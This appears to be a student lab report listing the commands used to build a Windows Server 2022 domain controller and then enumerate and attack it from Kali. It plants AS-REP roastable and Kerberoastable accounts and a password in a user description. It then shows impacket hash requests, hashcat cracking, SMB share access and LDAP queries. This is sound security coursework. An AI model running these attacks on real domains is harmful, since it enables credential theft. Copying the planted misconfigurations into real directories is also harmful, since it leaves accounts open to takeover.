---
title: "Project 02: Command and Tool Reference"
subtitle: "AI-Assisted Enumeration on a Windows Server 2022 Domain Controller"
---

## Note on accuracy

This project was carried out using existing operating-system and security tools (PowerShell cmdlets, Nmap, enum4linux-ng, smbclient, netexec, impacket, hashcat, ldapsearch) rather than custom-written code. This document lists the exact commands used, substituting for a "source code" artifact.

Commands for **Tasks 9-11** below are reproduced exactly as executed on the Kali Linux attacker VM, confirmed directly against terminal screenshots. Commands for **Tasks 2-8** reflect the standard PowerShell approach used during the initial server build; parameter values (exact OU names, account names, share paths) should be cross-checked against your own screenshots before final submission, as the precise invocations from that earlier build session were not individually screenshotted.

---

## Task 2-4: Server Rename, Static IP, AD DS Installation (and verification)

```powershell
# Verification commands (screenshotted, exact):
Get-ComputerInfo | Select-Object CsName, CsDomain
Get-NetIPConfiguration
Get-WindowsFeature AD-Domain-Services

# Standard build-time commands (representative; verify against your own history):
Rename-Computer -NewName "DC01" -Restart
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.67.10 -PrefixLength 24 -DefaultGateway 192.168.67.2
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 127.0.0.1
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
```

## Task 5: Promote to a Domain Controller

```powershell
Install-ADDSForest `
  -DomainName "mydomain.local" `
  -DomainNetbiosName "MYDOMAIN" `
  -InstallDns `
  -Force
# Prompts for a Directory Services Restore Mode (DSRM) password meeting complexity requirements
```

## Task 6: Troubleshoot the Network Problem

```powershell
dcdiag /q
Get-WinEvent -LogName "DFS Replication" | Select-Object -First 20 TimeCreated, Id, LevelDisplayName, Message
```
Result: dcdiag flagged a DFSREvent failure; direct log inspection confirmed all entries were Information-level service-startup messages, a known false positive on a newly-promoted, single Domain Controller with no replication partner.

## Task 7: Create a User Inside the DC

```powershell
New-ADOrganizationalUnit -Name "Corp" -Path "DC=mydomain,DC=local"

New-ADUser -Name "John Doe" -SamAccountName jdoe -Path "OU=Corp,DC=mydomain,DC=local" -AccountPassword (Read-Host -AsSecureString) -Enabled $true
New-ADUser -Name "Asha Rao" -SamAccountName arao -Path "OU=Corp,DC=mydomain,DC=local" -Description "Shared mailbox account, password Winter2026! until IT resets" -AccountPassword (Read-Host -AsSecureString) -Enabled $true
New-ADUser -Name "Backup Service" -SamAccountName svc_backup -Path "OU=Corp,DC=mydomain,DC=local" -AccountPassword (Read-Host -AsSecureString) -Enabled $true

New-ADGroup -Name "Finance" -GroupScope Global -Path "OU=Corp,DC=mydomain,DC=local"
Add-ADGroupMember -Identity "Finance" -Members jdoe

# Planted finding: AS-REP roastable account
Set-ADAccountControl -Identity arao -DoesNotRequirePreAuth $true

# Planted finding: Kerberoastable service account (SPN)
setspn -A MSSQLSvc/dc01.mydomain.local:1433 svc_backup

# Verification (avoids PowerShell's default table column-dropping behavior)
Get-ADUser svc_backup -Properties ServicePrincipalName | Format-List
```

## Task 8: Configure the SMB with the Help of AI

```powershell
New-Item -Path "C:\Shares\CorpData" -ItemType Directory
New-SmbShare -Name "CorpData" -Path "C:\Shares\CorpData" -FullAccess "Administrator" -ReadAccess "Domain Users"

Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol

New-NetFirewallRule -DisplayName "File and Printer Sharing" -Enabled True -Profile Any

auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Logoff" /success:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
```

## Task 9: Enumerate DNS/SMB with AI (Kali)

```bash
nmap -sC -sV -p- -oN nmap_dc01_full.txt 192.168.67.10
```

## Task 10: Enumerate SMB and Kerberos with AI (Kali)

```bash
enum4linux-ng -A ./enum4linux_dc01 192.168.67.10

smbclient -L //192.168.67.10 -U jdoe
smbclient //192.168.67.10/CorpData -U jdoe
# within smbclient session:
#   get budget_notes.txt
#   get backup_config.ini

netexec smb 192.168.67.10 -u jdoe -p 'WinThreshold3' --shares

impacket-GetNPUsers mydomain.local/arao -no-pass -dc-ip 192.168.67.10
impacket-GetNPUsers mydomain.local/jdoe -dc-ip 192.168.67.10 -request

impacket-GetUserSPNs mydomain.local/jdoe -dc-ip 192.168.67.10 -request

sudo apt install -y pocl-opencl-icd   # CPU OpenCL runtime fix for hashcat in a VM with no GPU passthrough

hashcat -m 18200 asrep_arao.hash /usr/share/wordlists/rockyou.txt         # dictionary attack: Exhausted, 0 recovered
hashcat -m 13100 -a 0 kerberoast_svcbackup.hash /usr/share/wordlists/rockyou.txt   # dictionary attack: Exhausted, 0 recovered

hashcat -m 18200 -a 0 asrep_arao.hash custom.txt          # custom wordlist: Cracked
hashcat -m 13100 -a 0 kerberoast_svcbackup.hash custom.txt   # custom wordlist: Cracked

hashcat -m 18200 asrep_arao.hash --show
hashcat -m 13100 kerberoast_svcbackup.hash --show
```

## Task 11: Enumerate LDAP Using Tools (Kali)

```bash
# Anonymous bind: can read RootDSE / naming contexts, cannot search the directory
ldapsearch -x -H ldap://192.168.67.10 -s base "(objectclass=*)"
ldapsearch -x -H ldap://192.168.67.10 -b "dc=mydomain,dc=local"   # rejected: operations error

# Authenticated bind: successful directory search
ldapsearch -x -H ldap://192.168.67.10 -D "jdoe@mydomain.local" -w 'WinThreshold3' \
  -b "dc=mydomain,dc=local" "(objectclass=user)" description
```

---

## Evidence files referenced (Kali: `~/Documents/SERVER EVAL 2022/`)

- `nmap_dc01_full.txt`
- `enum4linux_dc01.yaml`
- `budget_notes.txt`, `backup_config.ini`
- `asrep_arao.hash`
- `kerberoast_svcbackup.hash`
- `custom.txt`
